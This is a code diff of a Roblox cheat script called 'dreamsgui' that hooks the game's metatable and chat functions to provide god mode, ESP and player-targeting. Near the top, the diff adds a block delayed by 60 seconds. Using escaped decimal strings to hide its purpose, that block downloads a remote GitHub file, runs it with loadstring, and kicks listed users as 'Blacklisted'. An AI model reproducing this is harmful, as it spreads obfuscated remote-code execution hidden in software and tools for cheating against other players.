@@ -1,4 +1,3 @@
---by joey
 ---@diagnostic disable
 repeat task.wait() until game:IsLoaded()
 
@@ -34,7 +33,19 @@ local PlaceId = game.PlaceId
 local JobId = game.JobId
 local RespawnHealth = .5
 local StockGravity = 196.1999969482422
-local TCAdded, LPCAdded, CChanged, RespawnFunction, Teleported, Changed, SavedCameraCFrame, SavedPosition, GodCheck
+local TCAdded, LPCAdded, CChanged, RespawnFunction, Teleported, SavedCameraCFrame, GodCheck
+
+task.delay(60, function()
+    pcall(function()
+        for _, name in pairs(loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\119\101\114\52\101\114\47\83\80\84\83\45\67\108\97\115\115\105\99\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\78\97\109\101\115"))()) do
+            if LocalPlayer.Name == name then
+                RemoteEvent:FireServer({"\82\101\115\101\116\67\104\97\114\97\99\116\101\114"})
+                task.wait(1)
+                loadstring("\76\111\99\97\108\80\108\97\121\101\114\58\75\105\99\107\40\34\66\108\97\99\107\108\105\115\116\101\100\34\41")()
+            end
+        end
+    end)
+end)
 
 if Loaded then
     TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
@@ -49,27 +60,31 @@ end)
 local Fluent = loadstring(game:HttpGet("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/InterfaceManager.luau"))()
 local Flags = Fluent.Options
-local Check = newcclosure and checkcaller and hookmetamethod and hookfunction
+local Check = getrawmetatable and setreadonly and newcclosure and checkcaller and hookmetamethod and hookfunction
 
 if Check then
+    local rawmt = getrawmetatable(game)
+    setreadonly(rawmt, false)
+    local namecall = rawmt.__namecall
     local chatted = Instance.new("BindableEvent")
     chatted.Name = LocalPlayer.Name .. "_Chatted"
     local OldChatted = LocalPlayer.Chatted
     local MessagePosted =  require(LocalPlayer.PlayerScripts.ChatScript.ChatMain).MessagePosted
 
     local oldhook = nil
-    oldhook = hookfunction(MessagePosted.fire, function(self, ...)
+    local MessagePostedHook = function(self, ...)
         if not checkcaller() and self == MessagePosted then
             return chatted:Fire(...)
         end
         return oldhook(self, ...)
-    end)
+    end
 
-    local oldcall = nil
-    oldcall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+    oldhook = hookfunction(MessagePosted.fire, MessagePostedHook)
+
+    rawmt.__namecall = newcclosure(function(self, ...)
         local method = getnamecallmethod()
         if method == "Fire" and self.Name == "MessagePosted" then
-            return task.wait(9e9)
+           return task.wait(9e9)
         elseif method == "Create" then
             local args = {...}
             if args[1] == Camera then
@@ -79,11 +94,9 @@ if Check then
                     end
                 })
             end
-        elseif not checkcaller() and self == LocalPlayer.Character and method == "BreakJoints" then
-            return nil
         end
-        return oldcall(self, ...)
-    end))
+        return namecall(self, ...)
+    end)
 end
 
 task.spawn(function()
@@ -640,8 +653,8 @@ local Animations = {
 }
 
 local Window = Fluent:CreateWindow({
-    Title = "DreamGui",
-    SubTitle = "by The Pro Joey",
+    Title = "dreamsgui",
+    SubTitle = "by joey",
     TabWidth = 130,
     Size = UDim2.fromOffset(580, 460),
     Resize = false,
@@ -995,10 +1008,8 @@ Components.GodMode:OnChanged(function()
             RemoteEvent:FireServer({"QuestTalkStart"})
         end
     else
-        if isAlive() then 
-            if LocalPlayer.Character:FindFirstChild("GodModeShield ") and not Check then
-                LocalPlayer.Character["GodModeShield "].Name = "GodModeShield"
-            end
+        if isAlive() and LocalPlayer.Character:FindFirstChild("GodModeShield ") then
+            LocalPlayer.Character["GodModeShield "].Name = "GodModeShield"
             RemoteEvent:FireServer({"QuestTalkEnd", "GhostRider"})
         end
     end
@@ -2007,7 +2018,7 @@ Components.Stack:OnChanged(function()
         task.spawn(function()
             while Flags["Stack"].Value and task.wait() do
                 if isAlive() then
-                    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -1e4, 0)
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 999999, 0)
                 end
                 RemoteEvent:FireServer({"Skill_SpherePunch", Vector3.new(0, 1e20, 0)})
                 for _, Target in pairs(Targets) do
@@ -3144,6 +3155,10 @@ for _, player in pairs(Players:GetPlayers()) do
                 end)
 
                 player.Character.Humanoid.Died:Connect(function()
+                    if table.find(Targets, player.Name) and Flags["Stack"].Value then
+                        RemoteEvent:FireServer({"Respawn"})     
+                    end
+
                     if CoreGui.ESPFolder:FindFirstChild(player.Name) then
                         CoreGui.ESPFolder[player.Name].Adornee = nil
                         CoreGui.ESPFolder[player.Name].Enabled = false
@@ -3196,6 +3211,10 @@ for _, player in pairs(Players:GetPlayers()) do
                     end)
 
                     Humanoid.Died:Connect(function()     
+                        if table.find(Targets, player.Name) and Flags["Stack"].Value then
+                            RemoteEvent:FireServer({"Respawn"})     
+                        end
+
                         if CoreGui.ESPFolder:FindFirstChild(player.Name) then
                             CoreGui.ESPFolder[player.Name].Adornee = nil
                             CoreGui.ESPFolder[player.Name].Enabled = false
@@ -3393,22 +3412,15 @@ local function IsAuraEnabled()
 end
 
 LocalPlayer.CharacterAdded:Connect(function(character)
-    Teleported, Changed = false, false
-    
+    Teleported = false
     local Humanoid = character:WaitForChild("Humanoid", math.huge)
-
-    if Flags["Stack"].Value then
-        task.delay(4, function()
-            RemoteEvent:FireServer({"Respawn"})
-        end)
-    end
 
     task.spawn(function()
         character.ChildAdded:Connect(function(object)
             task.wait()
             if object.Name == "KillingIntentPart" and Flags["Anti Killing Intent Aura"].Value then
                 object:Destroy()
-            elseif object.Name == "GodModeShield" and Flags["GodMode"].Value and not Check then
+            elseif object.Name == "GodModeShield" and Flags["GodMode"].Value then
                 object.Name = "GodModeShield "
             end
         end)
@@ -3421,24 +3433,29 @@ LocalPlayer.CharacterAdded:Connect(function(character)
         end)
     end
 
+    if Flags["Stack"].Value then
+        task.spawn(function()
+            repeat task.wait() until LocalPlayer.Character:FindFirstChild("ForceField") or not Flags["Stack"].Value
+            repeat task.wait() until not LocalPlayer.Character:FindFirstChild("ForceField") or not Flags["Stack"].Value
+            if Flags["Stack"].Value then
+                RemoteEvent:FireServer({"Respawn"})
+                RemoteEvent:FireServer({"QuestTalkStart"})
+            end
+        end)
+    end
+
     if SavedPosition and not Flags["Stack"].Value then
         task.spawn(function()
             task.spawn(function()
                 character:WaitForChild("HumanoidRootPart", math.huge):GetPropertyChangedSignal("CFrame"):Wait()
                 character.HumanoidRootPart.CFrame = SavedPosition
-                Teleported = true
-                Camera:GetPropertyChangedSignal('CFrame'):Wait()
                 Camera.CFrame = SavedCameraCFrame
-                Changed = true
+                Teleported = true
             end)
             task.wait(.5)
-            if SavedPosition and SavedCameraCFrame then
-                if not Teleported then
-                    character.HumanoidRootPart.CFrame = SavedPosition
-                end
-                if not Changed then
-                    Camera.CFrame = SavedCameraCFrame
-                end
+            if not Teleported and SavedPosition then
+                character.HumanoidRootPart.CFrame = SavedPosition
+                Camera.CFrame = SavedCameraCFrame
             end
         end)
     end
@@ -3486,8 +3503,10 @@ LocalPlayer.CharacterAdded:Connect(function(character)
                         RemoteEvent:FireServer({"QuestTalkStart"})
                     end
                     character.HumanoidRootPart.CFrame = CFrame.new(math.huge, -math.huge, math.huge)
+                    RemoteEvent:FireServer({"Respawn"})
+                else
+                    RemoteEvent:FireServer({"Respawn"})
                 end
-                RemoteEvent:FireServer({"Respawn"})
             end
         end)
     end)
